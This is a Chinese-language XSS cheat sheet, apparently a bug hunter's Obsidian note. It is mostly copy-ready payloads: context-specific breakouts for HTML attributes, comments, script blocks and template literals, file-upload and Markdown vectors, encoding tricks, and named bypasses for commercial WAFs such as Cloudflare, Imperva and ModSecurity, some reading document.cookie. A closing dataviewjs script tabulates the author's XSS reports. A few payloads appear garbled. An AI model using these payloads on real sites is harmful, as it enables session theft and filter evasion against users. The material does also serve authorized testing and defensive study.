## XSS 速查表

### 介绍

> 跨站脚本（XSS）攻击是一种注入攻击类型，恶意脚本被注入到网站中。有三种类型的XSS攻击：

*   > 反射型XSS

    > 攻击中，恶意脚本通过Web浏览器从另一个网站运行

*   > 存储型XSS

    > 存储攻击是那些恶意脚本永久存储在目标服务器上的攻击

*   > 基于DOM的XSS

    > 一种XSS类型，其中载荷在DOM中找到，而不是在HTML代码中找到。

### 发现位置

> 这种漏洞可能出现在应用程序的所有功能中。如果要查找DOM型XSS，可以通过阅读JavaScript源代码来找到它。

### 如何利用

1. 基本的Payload

```html
<script>alert(1)</script>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
```

2. 在HTML标签值中添加 ' 或 " 以转义Payload

```html
"><script>alert(1)</script>
'><script>alert(1)</script> 
```

* 示例源代码

```html
<input id="keyword" type="text" name="q" value="REFLECTED_HERE">
```

* 输入Payload后

```html
<input id="keyword" type="text" name="q" value=""><script>alert(1)</script>
```

3. 如果输入落在HTML注释中，请添加 --> 以转义Payload。

```html
--><script>alert(1)</script>
```

* 示例源代码

```html
<!-- REFLECTED_HERE --> 
```

* 输入Payload后

```html
<!-- --><script>alert(1)</script> -->
```

4. 当输入位于或在开放/关闭标签之间时，标签可以是 `<a>,<title>,<script>` 和任何其他HTML标签。

```html
</tag><script>alert(1)</script>
"></tag><script>alert(1)</script>
```

* 示例源代码

```html
<a href="https://target.com/1?status=REFLECTED_HERE">1</a>
```

* 输入Payload后

```html
<a href="https://target.com/1?status="></a><script>alert(1)</script>">1</a>
```

5. 当输入位于HTML标签属性值中但被过滤掉了 > 时，请使用 </script>。

```html
" onmouseover=alert(1)
" autofocus onfocus=alert(1)
```

* 示例源代码

```html
<input id="keyword" type="text" name="q" value="REFLECTED_HERE">
```

* 输入Payload后

```html
<input id="keyword" type="text" name="q" value="" onmouseover=alert(1)">
```

6. 当输入位于 `<script>` 标签内部时，请使用 </script>。

```html
</script><script>alert(1)</script>
```

* 示例源代码

```html
<script>
    var sitekey = 'REFLECTED_HERE';
</script>
```

* 输入Payload后

```html
<script>
    var sitekey = '</script><script>alert(1)</script>';
</script>
```

### `XSS 速查表（高级）`

7. 当输入位于脚本块内、字符串定界值内时使用。

```html
'-alert(1)-'
'/alert(1)//
```

* 示例源代码

```html
<script>
    var sitekey = 'REFLECTED_HERE';
</script>
```

* 如果输入Payload为 '-alert(1)-'，则如下所示

```html
<script>
    var sitekey = ''-alert(1)-'';
</script>
```

> 引号被反斜杠转义，所以我们需要绕过它们

* 输入Payload后

```html
<script>
    var sitekey = '\\'alert(1)//';
</script>
```

8. 当同一行JS代码中有多个反射时使用。

```html
/alert(1)//\
/alert(1)}//\
```

* 示例源代码

```html
<script>
    var a = 'REFLECTED_HERE'; var b = 'REFLECTED_HERE';
</script>
```

* 输入Payload后

```html
<script>
    var a = '/alert(1)//\'; var b = '/alert(1)//\';
</script>
```

9. 当输入在字符串定界值内且在单个逻辑块内（如函数或条件语句中，如if、else等）时使用。

```html
'}alert(1);{'
\'}alert(1);{// 
```

* 示例源代码

```html
<script>
    var greeting;
    var time = 1;
    if (time < 10) {
    test = 'REFLECTED_HERE';
  }
</script>
```

* 输入Payload后

```html
<script>
    var test;
    var time = 1;
    if (time < 10) {
    test = ''}alert(1);{'';
  }
</script>
```

> 负载2用于在引号被反斜杠转义的情况下使用

* 输入Payload后

```html
<script>
    var sitekey = '\'alert(1)//';
</script>
```

10. 当输入位于反引号定界字符串内时使用。

```html
${alert(1)}
```

* 示例源代码

```html
<script>
    var dapos = `REFLECTED_HERE`;
</script>
```

* 输入Payload后

```html
<script>
    var dapos = `${alert(1)}`;
</script>
```

11. 在Markdown中使用。

```html
[Click Me](javascript:alert('1'))
```

12. 在XML页面中使用。

```html
<a:script xmlns:x="http://www.worg/1999/xhtml">alert(1)</a:script>
```

> 如果输入落在注释部分，请添加 "-->" 到Payload。

> 如果输入落在CDATA部分，请添加 "]]>" 到Payload。

### `XSS 速查表（绕过）`

13. 大小写混合使用。

```html
<Script>alert(document.cookie)</Script> 
```

14. 未闭合标签。

```html
<svg onload="alert(1)"
```

15. 大写Payload。

```html
<SVG ONLOAD=AL

ERT(1)>
```

16. 编码XSS。

```html
(已编码)
%3Csvg%20onload%3Dalert(1)%3E 

(双重编码)
%253Csvg%2520onload%253Dalert%281%29%253E 

(三重编码)
%25253Csvg%252520onload%25253Dalert%25281%2529%25253E 
```

17. JS中使用小写输入。

```html
<SCRİPT>alert(1)</SCRİPT>
```

18. PHP电子邮件验证绕过。

```html
<svg/onload=alert(1)>"@gmail.com
```

19. PHP URL验证绕过。

```html
javascript://%250Aalert(1)
```

20. 在文件名中使用XSS（文件上传）。

```
"><svg onload=alert(1)>.jpeg
```

21. 在元数据中使用XSS（文件上传）。

```
$ exiftool -Artist='"><script>alert(1)</script>' dapos.jpeg
```

22. 使用SVG文件进行XSS（文件上传）。

```
<svg xmlns="http://www.worg/2000/svg" onload="alert(1)"/>
```

23. 通过Markdown进行XSS。

```
[Click Me](javascript:alert('1'))
```

24. XML页面中的XSS。

```
<a:script xmlns:x="http://www.worg/1999/xhtml">alert(1)</a:script>
```

> 如果输入在评论部分，请添加 "-->" 到Payload。

> 如果输入在CDATA部分，请添加 "]]>" 到Payload。

### `绕过WAF`

1. Cloudflare

```
<svg%0Aonauxclick=0;[1].some(confirm)//

<svg/onload={alert`1`}>

<a/href=j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(1)&rpar;>

"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;

"><onx=[] onmouseover=prompt(1)>

%2sscript%2ualert()%2s/script%2u

"Onx=() onMouSeoVer=prompt(1)>"Onx=[] onMouSeoVer=prompt(1)>"/*/Onx=""//onfocus=prompt(1)>"//Onx=""/*/%01onfocus=prompt(1)>"%01onClick=prompt(1)>"%2501onclick=prompt(1)>"onClick="(prompt)(1)"Onclick="(prompt(1))"OnCliCk="(prompt`1`)"Onclick="([1].map(confirm))

[1].map(confirm)'ale'+'rt'()a&Tab;l&Tab;e&Tab;r&Tab;t(1)prompt&lpar;1&rpar;prompt&#40;1&#41;prompt%26%2300000000000000000040;1%26%2300000000000000000041;(prompt())(prompt``)

<svg onload=alert%26%230000000040"1")>

<svg onload=prompt%26%230000000040document.domain)>

<svg onload=prompt%26%23x000000028;document.domain)>

<svg/onrandom=random onload=confirm(1)>

<video onnull=null onmouseover=confirm(1)>

<a id=x tabindex=1 onbeforedeactivate=print(`XSS`)></a><input autofocus>

<img ignored=() src=x onerror=prompt(1)>

<svg onx=() onload=(confirm)(1)>

<--`<img/src=` onerror=confirm``> --!>

<img src=x onerror="a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]](document.domain)">

<j id=x style="-webkit-user-modify:read-write" onfocus={window.onerror=eval}throw/0/+name>H</j>#x

'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>

'"><img/src/onerror=.1|alert``>

:javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie

Function("\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29")();
```

2. Cloudfront

```
">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>

<--`<img%2fsrc%3d` onerror%3dalert(document.domain)> --!>

"><--<img+src= "><svg/onload+alert(document.domain)>> --!>
```

3. Cloudbric

```
<a69/onclick=[1].findIndex(alert)>pew
```

4. Comodo WAF

```
<input/oninput='new Function`confir\\u006d\\`0\\``'>

<p/ondragstart=%27confirm(0)%replace(/.+/,eval)%20draggable=True>dragme
```

5. ModSecurity

```
<a href="jav%0Dascript&colon;alert(1)">
```

6. Imperva

```
<input id='a'value='global'><input id='b'value='E'><input 'id='c'value='val'><input id='d'value='aler'><input id='e'value='t(documen'><input id='f'value='t.domain)'><svg+onload[\\r\\n]=$[a.value+b.value+c.value](d.value+e.value+f.value)>

<x/onclick=globalThis&lsqb;'\\u0070r\\u006f'+'mpt']&lt;)>clickme

<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click

<a69/onclick=write&lpar;&rpar;>pew

<details/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];"/open>

<svg onload\\r\\n=$.globalEval("al"+"ert()");>

<svg/onload=self[`aler`%2b`t`]`1`>

%3Cimg%

2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E

<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>

<img/src=q onerror='new Function`al\\ert\\`1\\``'>

<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
```

7. AWS

```
<script>eval(atob(decodeURIComponent(confirm`1`)))</script>
```

> 如果您想查看其他WAF的负载，请查看此链接。

### 参考资料

*   Brute Logic
*   Awesome-WAF
*   一些随机的Twitter帖子


## 案例

```dataviewjs
let tableData = [];

// 获取具有标签 #xss 的文件路径
for (let note of dv.pagePaths('"Bughunter-report" and #xss')) {
    dv.io.load(note).then((fileContent) => {
        if (fileContent !== undefined) {
            // 将文件内容按行分割成数组
            let lines = fileContent.split('\n');
            let Markdown = dv.fileLink(note)
            let title = ''; // 存储二级标题作为 "Title"
            let summaryContent = '';
            let stepContent = '';
            let impactContent = '';
				let count = 0;
            // 存储当前正在处理的三级标题
            let currentSection = '';

            // 遍历每一行文本
            for (let i = 0; i < lines.length; i++) {
                let line = lines[i];
                if (line.startsWith('## ') && lines[i + 1] && lines[i + 1].includes('#xss')) {
                    // 如果是满足条件的二级标题，将其作为 "Title"
                    title = line.replace('## ', '');
                    continue;
                } else if (line.startsWith('### Summary')) {
                    currentSection = 'Summary';
                    summaryContent = '';
                } else if (line.startsWith('### Step')) {
                    currentSection = 'Step';
                    stepContent = '';
                } else if (line.startsWith('### Impact')) {
                    currentSection = 'Impact';
                    impactContent = '';
                } else if (line.startsWith('### ')) { 
                    // 其他三级标题，跳过处理 
                    currentSection = '';
                }
                
                // 在此处将处理内容的部分与行同级
                if (currentSection === 'Summary') {
                    summaryContent += line + '\n';
                } else if (currentSection === 'Step') {
                    stepContent += line + '\n';
                } else if (currentSection === 'Impact') {
                    impactContent += line + '\n';
                    count ++ ;
                }

                // 判断是否推送数据
                if ((lines[i+1].startsWith('## ') && lines[i + 2] && lines[i + 2].includes('#xss')) || (i === lines.length - 2)) {
                    // 将标题和内容添加到表格数据
                    tableData.push([Markdown, title, summaryContent.trim(), stepContent.trim(), impactContent.trim()]);
                    title = ''; // 存储二级标题作为 "Title"
                    summaryContent = '';
                    stepContent = '';
                    impactContent = '';
                    count = 0; // 重置 count 的值
                }
            }
        }
    });
}

// 创建包含四列的表格，"Markdown","Title", "Summary", "Step" 和 "Impact"
setTimeout(() => {
    dv.table(["Markdown","Title", "Summary", "Step", "Impact"], tableData);
}, 1000); // 使用适当的延迟时间等待异步操作完成


```